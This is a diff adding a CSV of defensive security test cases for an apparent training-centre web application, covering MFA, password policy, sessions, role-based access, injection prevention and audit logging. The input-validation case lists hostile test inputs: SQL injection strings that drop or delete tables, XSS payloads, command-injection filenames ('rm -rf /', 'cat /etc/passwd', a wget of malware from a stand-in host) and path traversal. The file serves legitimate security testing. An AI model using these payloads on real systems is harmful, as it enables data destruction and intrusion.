@@ -1,0 +1,388 @@
+Test ID,Module,Test Case Title,Test Description,User Role,Specialized Test Steps,Expected Result,Security Validation Points,Test Data Required,Threat Model Coverage,Compliance Requirements,Browser Requirements,Priority,Status,Security Level,Notes
+AUTH-SEC-001,Authentication,Multi-Factor Authentication Implementation,Test MFA setup and validation process for high-privilege accounts,Admin,"1. Login as system administrator
+2. Navigate to Security Settings → Multi-Factor Authentication
+3. Test MFA Setup Process:
+   - Generate QR code for Google Authenticator
+   - Scan QR code with mobile authenticator app
+   - Enter verification code from app
+   - Save backup recovery codes
+4. Logout and attempt login with MFA:
+   - Enter username and password
+   - System prompts for MFA code
+   - Enter 6-digit code from authenticator app
+   - Verify successful login with MFA badge
+5. Test MFA Bypass Attempts:
+   - Try login without MFA code
+   - Test with expired MFA code (>30 seconds old)
+   - Attempt login with incorrect MFA code
+   - Test backup code usage
+6. Test Account Lockout:
+   - Enter wrong MFA code 5 times
+   - Verify account locks for 15 minutes
+   - Test admin unlock functionality
+7. Test MFA Reset Process:
+   - Request MFA reset via admin panel
+   - Verify old MFA codes no longer work
+   - Setup new MFA device and test
+8. Test Session Behavior with MFA:
+   - Verify MFA required only at login (not for each action)
+   - Test session timeout with MFA-enabled account
+   - Verify concurrent session limitations","MFA is properly implemented with secure setup process. Account lockout mechanisms work correctly. Session management respects MFA security levels.","1. QR code generated with proper encoding and expiration
+2. Authenticator app integration works with TOTP standard
+3. Backup codes are cryptographically secure (12 codes, 8 chars each)
+4. MFA bypass attempts fail with appropriate error messages
+5. Account lockout triggers after 5 failed MFA attempts
+6. Lockout duration is configurable (default 15 minutes)
+7. Audit logs record all MFA events with timestamps
+8. MFA reset requires admin approval and notification
+9. Session cookies include MFA verification flag
+10. Password change requires MFA re-verification
+11. MFA settings cannot be disabled by user (admin only)
+12. Backup codes can only be used once","Admin account with MFA capability
+Google Authenticator or similar TOTP app
+Test email account for notifications
+Multiple devices for concurrent session testing",Authentication bypass attacks,NIST 800-63B Multi-Factor Authentication Guidelines,Chrome 118+, Firefox 115+, Safari 16+, Edge 118+,Critical,Pending,Level 3 - High Security,Test with hardware tokens if available
+AUTH-SEC-002,Authentication,Password Policy Enforcement and Strength Testing,Test comprehensive password policy implementation and strength validation,All Roles,"1. Navigate to password change/registration form
+2. Test Password Complexity Requirements:
+   - Minimum 12 characters
+   - At least 1 uppercase letter
+   - At least 1 lowercase letter
+   - At least 2 numbers
+   - At least 1 special character (!@#$%^&*()_+-=[]{}|;:,.<>?)
+   - No dictionary words or common patterns
+3. Test Password Strength Meter:
+   - Enter weak password: 'password123' → Should show 'Weak'
+   - Enter medium password: 'MyPass123!' → Should show 'Medium'
+   - Enter strong password: 'R3h@b!1Ch@mp2024#Str0ng' → Should show 'Strong'
+   - Test real-time strength indicator updates
+4. Test Password History Prevention:
+   - Change password to new strong password
+   - Immediately try to change back to previous password
+   - Verify system prevents reuse of last 12 passwords
+   - Test password history across multiple changes
+5. Test Common Password Prevention:
+   - Try 'Password123!' → Should reject as too common
+   - Try 'qwerty123!' → Should reject as keyboard pattern
+   - Try '123456789!' → Should reject as numeric sequence
+   - Try user's name + year → Should reject as personal info
+6. Test Password Expiration Policy:
+   - Set password expiration to 90 days for testing
+   - Verify warning notifications start 14 days before expiration
+   - Test forced password change on expiration
+   - Verify expired account cannot login until password changed
+7. Test Account Lockout for Failed Passwords:
+   - Enter wrong password 5 times consecutively
+   - Verify account locks for 30 minutes
+   - Test progressive lockout (1min, 5min, 15min, 30min)
+   - Verify lockout notification sent to user email
+8. Test Password Reset Security:
+   - Request password reset via email
+   - Verify reset link expires in 1 hour
+   - Test that reset link can only be used once
+   - Verify old password is invalidated after reset","Password policy prevents weak passwords and enforces security standards. Account lockout mechanisms prevent brute force attacks. Password reset process is secure.","1. Password complexity validation works in real-time
+2. Strength meter accurately reflects password security
+3. Common passwords database blocks 10,000+ weak passwords
+4. Password history prevents reuse of last 12 passwords
+5. Dictionary attack prevention works for English and local languages
+6. Personal information (name, email, ID) cannot be used in password
+7. Password expiration warnings sent at 14, 7, 3, 1 days before expiry
+8. Expired passwords force immediate change on login
+9. Account lockout triggers after 5 consecutive failed attempts
+10. Progressive lockout increases duration: 1min → 5min → 15min → 30min
+11. Password reset links expire in 60 minutes
+12. Reset links are single-use and cryptographically secure
+13. All password events logged with IP address and timestamp","Test accounts for password testing
+Common password dictionary (rockyou.txt subset)
+Email configuration for notifications
+Various password combinations for testing",Brute force password attacks,OWASP Authentication Security Verification Standard,All supported browsers,Critical,Pending,Level 3 - High Security,Test with password cracking tools if available
+AUTH-SEC-003,Authentication,Session Management and Hijacking Prevention,Test comprehensive session security including hijacking prevention and concurrent session management,All Roles,"1. Test Secure Session Creation:
+   - Login with valid credentials
+   - Inspect session cookie in browser dev tools
+   - Verify cookie has HttpOnly flag (prevents XSS access)
+   - Verify Secure flag is set (HTTPS only)
+   - Verify SameSite attribute is set to 'Strict'
+   - Check session ID is cryptographically random (128+ bits)
+2. Test Session Fixation Prevention:
+   - Note session ID before login
+   - Complete login process
+   - Verify session ID changes after authentication
+   - Test that old session ID is invalidated
+3. Test Session Hijacking Protection:
+   - Login from Browser A and note session cookie
+   - Open Browser B (different IP if possible)
+   - Manually set same session cookie in Browser B
+   - Attempt to access protected resources
+   - Verify access denied due to IP/browser fingerprinting
+4. Test Concurrent Session Management:
+   - Login from Device 1 (Desktop Chrome)
+   - Login from Device 2 (Mobile Safari) with same credentials
+   - Test concurrent session policy:
+     * Option A: Allow multiple sessions
+     * Option B: Invalidate previous session
+     * Option C: Prompt user to choose
+   - Verify chosen policy is enforced correctly
+5. Test Session Timeout Security:
+   - Login and note session start time
+   - Leave system idle for configured timeout (30 minutes)
+   - Attempt to access protected resource
+   - Verify automatic logout with security message
+   - Test that session cannot be resumed
+6. Test Session Invalidation:
+   - Login and perform normal operations
+   - Click logout button
+   - Use browser back button to try accessing protected pages
+   - Verify all pages redirect to login
+   - Check that session cookie is properly cleared
+7. Test Session Data Isolation:
+   - Login as User A (Teacher role)
+   - Note accessible menu items and data
+   - Logout and login as User B (Admin role)
+   - Verify no residual data from User A session
+   - Test that role permissions are completely separate
+8. Test Session Replay Attack Prevention:
+   - Capture HTTP request with session cookie
+   - Logout to invalidate session
+   - Replay captured request
+   - Verify request is rejected with 401 Unauthorized","Session management prevents hijacking and replay attacks. Concurrent sessions are properly managed. Session data isolation is complete between users.","1. Session cookies have all security flags: HttpOnly, Secure, SameSite=Strict
+2. Session IDs are cryptographically random (minimum 128 bits entropy)
+3. Session ID regenerates on authentication (prevents fixation)
+4. IP address binding prevents session hijacking from different locations
+5. Browser fingerprinting adds additional hijacking protection
+6. Concurrent session policy enforced consistently
+7. Session timeout configured appropriately (30 minutes idle)
+8. Automatic logout warning appears 5 minutes before timeout
+9. Session invalidation clears all server-side data
+10. Logout invalidates session immediately and completely
+11. Browser cache cannot access protected pages after logout
+12. Session replay attacks fail with proper error messages
+13. Cross-user session data never leaks between accounts
+14. Role-based session data is completely isolated","Multiple user accounts with different roles
+Multiple devices/browsers for concurrent testing
+Network capture tools (Burp Suite, OWASP ZAP)
+Different IP addresses for hijacking tests",Session hijacking and replay attacks,OWASP Session Management Cheat Sheet,Chrome, Firefox, Safari, Edge, Mobile browsers,Critical,Pending,Level 3 - High Security,Test with professional security tools
+AUTH-SEC-004,Authentication,Role-Based Access Control (RBAC) Security Testing,Test comprehensive RBAC implementation including privilege escalation prevention,All Roles,"1. Test Role Definition and Assignment:
+   - Login as Admin and review role definitions
+   - Verify roles: Admin, Teacher, Supervisor, AJK, Trainee
+   - Check that each role has clearly defined permissions
+   - Test role assignment process for new users
+2. Test Admin Role Privileges:
+   - Verify Admin can access all system functions
+   - Test user management (create, edit, delete, role changes)
+   - Test system configuration access
+   - Test activity creation and modification
+   - Test centre management capabilities
+   - Verify Admin can view all centres' data
+3. Test Teacher Role Restrictions:
+   - Login as Teacher and test accessible functions
+   - Verify can manage assigned activities only
+   - Test attendance marking for own sessions only
+   - Verify cannot access user management
+   - Test cannot create new activities (Admin only)
+   - Verify can view trainees enrolled in own activities only
+4. Test Supervisor Role Capabilities:
+   - Login as Supervisor and test oversight functions
+   - Verify can view team performance reports
+   - Test access to centre-specific data only
+   - Verify cannot modify system settings
+   - Test staff performance monitoring capabilities
+   - Verify cannot access other centres' data
+5. Test AJK Role Functionality:
+   - Login as AJK and test facility management functions
+   - Verify asset management capabilities
+   - Test centre configuration access
+   - Verify facility scheduling permissions
+   - Test cannot access user personal data
+   - Verify cannot modify activities or attendance
+6. Test Trainee Role Limitations:
+   - Login as Trainee and verify minimal access
+   - Test can view own profile and schedule only
+   - Verify cannot access other trainees' data
+   - Test cannot modify any system data
+   - Verify cannot access staff or admin functions
+7. Test Privilege Escalation Prevention:
+   - Attempt direct URL access to unauthorized pages
+   - Test API endpoint access with insufficient privileges
+   - Try to modify role through browser dev tools
+   - Attempt SQL injection to elevate privileges
+   - Test session token manipulation
+8. Test Horizontal Privilege Escalation:
+   - Login as Teacher A assigned to Centre 01
+   - Attempt to access Centre 02 data
+   - Try to view other teachers' sessions
+   - Attempt to modify other teachers' data
+   - Test trainee attempting to access other trainees' profiles
+9. Test Dynamic Role Changes:
+   - Admin changes Teacher role to Supervisor
+   - Verify user must re-login for role change to take effect
+   - Test that previous permissions are immediately revoked
+   - Verify new permissions are properly applied
+   - Test role change audit logging","RBAC system prevents unauthorized access completely. Privilege escalation attempts fail securely. Role changes are properly enforced with audit trails.","1. Each role has clearly documented permissions matrix
+2. Admin role has full system access without restrictions
+3. Teacher role limited to assigned activities and enrolled trainees
+4. Supervisor role limited to assigned centre data only
+5. AJK role limited to facility and asset management
+6. Trainee role limited to personal data viewing only
+7. Direct URL access to unauthorized pages returns 403 Forbidden
+8. API endpoints validate role permissions before processing
+9. Browser dev tools cannot modify user roles or permissions
+10. SQL injection attempts for privilege escalation fail
+11. Session manipulation cannot elevate privileges
+12. Cross-centre data access properly blocked
+13. Role changes require admin privileges and user re-authentication
+14. All access attempts logged with user, role, resource, and result
+15. Unauthorized access attempts trigger security alerts","User accounts for each role type
+Cross-centre test data for isolation testing
+Security testing tools (Burp Suite, OWASP ZAP)
+Admin account for role management testing",Privilege escalation attacks,NIST RBAC Standard,Chrome, Firefox, Safari, Edge,Critical,Pending,Level 3 - High Security,Test with automated security scanners
+AUTH-SEC-005,Authentication,Input Validation and Injection Prevention,Test comprehensive input validation and protection against injection attacks,All Roles,"1. Test SQL Injection Prevention:
+   - Login form: Enter 'admin@test.com'; DROP TABLE users; --' as email
+   - Search fields: Enter '1' OR '1'='1' --' in activity search
+   - Profile update: Try updating name to '; DELETE FROM trainees; --'
+   - Attendance form: Enter 'trainee_id = 1 OR 1=1' in hidden fields
+   - Verify all SQL injection attempts fail without executing
+2. Test Cross-Site Scripting (XSS) Prevention:
+   - Profile name: Enter '<script>alert(\"XSS\")</script>'
+   - Activity description: Enter '<img src=x onerror=alert(\"XSS\")>'
+   - Comment fields: Enter 'javascript:alert(\"XSS\")'
+   - File upload names: Upload file named '<script>alert(1)</script>.jpg'
+   - Verify all XSS attempts are properly escaped or sanitized
+3. Test Cross-Site Request Forgery (CSRF) Prevention:
+   - Inspect forms for CSRF tokens
+   - Attempt form submission without valid CSRF token
+   - Try to replay form submission with old CSRF token
+   - Test CSRF token uniqueness across different users
+   - Verify CSRF protection on all state-changing operations
+4. Test Command Injection Prevention:
+   - File upload: Try uploading file with name 'test.jpg; rm -rf /'
+   - Export functions: Enter '; cat /etc/passwd' in filename
+   - Backup operations: Try '; wget malicious-site.com/malware'
+   - Verify system commands cannot be injected through user input
+5. Test LDAP Injection Prevention (if LDAP integration exists):
+   - Username field: Enter 'admin)(|(password=*))'
+   - Search filters: Enter '*)(uid=*))(|(uid=*'
+   - Verify LDAP queries are properly parameterized
+6. Test File Upload Security:
+   - Upload executable files (.exe, .sh, .php)
+   - Upload files with double extensions (.jpg.php)
+   - Upload oversized files (>10MB)
+   - Upload files with malicious content (EICAR test string)
+   - Test file type validation and virus scanning
+7. Test Path Traversal Prevention:
+   - File download: Try '../../../etc/passwd' as filename
+   - Image display: Enter '../../config/database.php' as image path
+   - Report generation: Try '../logs/application.log' as template
+   - Verify path traversal attempts are blocked
+8. Test Input Length and Format Validation:
+   - Enter extremely long strings (>10,000 chars) in text fields
+   - Test special characters in name fields
+   - Enter invalid date formats
+   - Test negative numbers where positive expected
+   - Verify proper validation messages for all invalid inputs
+9. Test XML/JSON Injection (if applicable):
+   - API requests: Inject malicious XML/JSON payloads
+   - File imports: Upload XML files with external entity references
+   - Test JSON parameter pollution attacks
+   - Verify proper parsing and validation","All injection attacks are prevented through proper input validation. Security measures do not impact legitimate functionality. Error messages do not reveal system information.","1. SQL injection attempts return generic error messages
+2. Database queries use parameterized statements exclusively
+3. XSS attempts are HTML-encoded or stripped before display
+4. Content Security Policy (CSP) headers prevent inline scripts
+5. CSRF tokens are present on all forms and properly validated
+6. CSRF tokens are unique per session and expire appropriately
+7. Command injection attempts fail without system access
+8. File uploads are scanned for malware and restricted by type
+9. Path traversal attempts return 'File not found' errors
+10. Input length limits prevent buffer overflow attacks
+11. Data type validation prevents type confusion attacks
+12. XML parsing disables external entity processing
+13. JSON parsing prevents prototype pollution
+14. All validation errors logged for security monitoring
+15. Error messages are user-friendly and non-revealing","Comprehensive test payloads for each injection type
+Security testing tools (SQLMap, Burp Suite, OWASP ZAP)
+Malware test files (EICAR string)
+Various file types for upload testing",All injection attack vectors,OWASP Input Validation Cheat Sheet,All supported browsers,Critical,Pending,Level 3 - High Security,Use automated vulnerability scanners
+AUTH-SEC-006,Authentication,Audit Logging and Security Monitoring,Test comprehensive security event logging and monitoring capabilities,Admin,"1. Test Authentication Event Logging:
+   - Perform successful login → Verify log entry with timestamp, IP, user agent
+   - Perform failed login → Verify failed attempt logged with details
+   - Test account lockout → Verify lockout event and reason logged
+   - Change password → Verify password change event logged
+   - Test MFA events → Verify MFA setup, success, and failure events
+2. Test Authorization Event Logging:
+   - Access authorized resource → Verify access granted logged
+   - Attempt unauthorized access → Verify access denied event logged
+   - Role change → Verify old role, new role, and admin who changed
+   - Permission modification → Verify detailed permission change log
+3. Test Data Access Logging:
+   - View trainee profile → Verify data access logged with trainee ID
+   - Export trainee data → Verify export event with data scope logged
+   - Modify trainee information → Verify before/after values logged
+   - Delete records → Verify deletion event with full data backup logged
+4. Test Administrative Action Logging:
+   - Create new user → Verify user creation with all details logged
+   - System configuration change → Verify old/new values logged
+   - Backup operations → Verify backup start, completion, and file details
+   - System maintenance → Verify maintenance window and actions logged
+5. Test Security Event Monitoring:
+   - Multiple failed logins → Verify security alert generated
+   - Unusual access patterns → Test anomaly detection logging
+   - Privilege escalation attempts → Verify security incident logged
+   - After-hours access → Verify out-of-hours access monitoring
+6. Test Log Integrity and Retention:
+   - Verify logs are digitally signed or checksummed
+   - Test log file rotation and archival
+   - Verify logs retained for required compliance period (7 years)
+   - Test log backup and restore procedures
+   - Verify logs cannot be modified by non-admin users
+7. Test Log Search and Analysis:
+   - Search logs by user ID across date range
+   - Filter logs by event type (authentication, authorization, data access)
+   - Generate security reports from log data
+   - Test real-time log monitoring dashboard
+   - Verify log export functionality for external analysis
+8. Test Privacy and Compliance Logging:
+   - Data subject access request → Verify complete activity log provided
+   - Data processing consent → Verify consent logging with timestamps
+   - Data retention policy → Verify automatic data deletion logged
+   - Cross-border data transfer → Verify transfer logging with legal basis
+9. Test Log Security and Access Control:
+   - Verify logs stored in tamper-evident format
+   - Test log access requires appropriate admin privileges
+   - Verify log viewing activities are also logged (meta-logging)
+   - Test log data encryption at rest and in transit
+10. Test Incident Response Integration:
+    - Generate security incident → Verify automatic alert creation
+    - Test integration with SIEM system (if applicable)
+    - Verify incident escalation procedures
+    - Test forensic log collection for investigations","Security logging captures all relevant events with complete details. Log integrity is maintained with proper access controls. Incident response integration works correctly.","1. All authentication events logged with complete context:
+   - Timestamp (UTC), User ID, IP address, User agent, Result
+   - Failed attempts include attempted username/email
+   - Session creation and termination events
+2. Authorization events include full permission context:
+   - Resource accessed, Permission required, Access result
+   - Role-based access decisions logged
+   - Administrative permission changes tracked
+3. Data access logging includes:
+   - Data subject (trainee/user) accessed
+   - Type of data accessed (profile, attendance, etc.)
+   - Purpose of access (view, modify, export, delete)
+   - Data retention and deletion events
+4. Administrative actions fully audited:
+   - System configuration changes with before/after values
+   - User management actions with full details
+   - Backup and maintenance operations
+5. Security monitoring capabilities:
+   - Real-time anomaly detection for unusual patterns
+   - Automated alerting for security events
+   - Dashboard for security event visualization
+6. Log integrity maintained through:
+   - Digital signatures or checksums on log files
+   - Append-only log storage
+   - Regular integrity verification
+   - Tamper detection and alerting
+7. Compliance requirements met:
+   - 7-year log retention policy enforced
+   - GDPR data processing logging
+   - Healthcare compliance logging (if applicable)
+   - Audit trail for regulatory reporting","Admin access for log configuration
+Test accounts for various log event generation
+SIEM integration (if available)
+Compliance requirements documentation",Security incident response,ISO 27001 Audit and Logging Standards,All supported browsers,High,Pending,Level 2 - Medium Security,Integrate with external SIEM if available
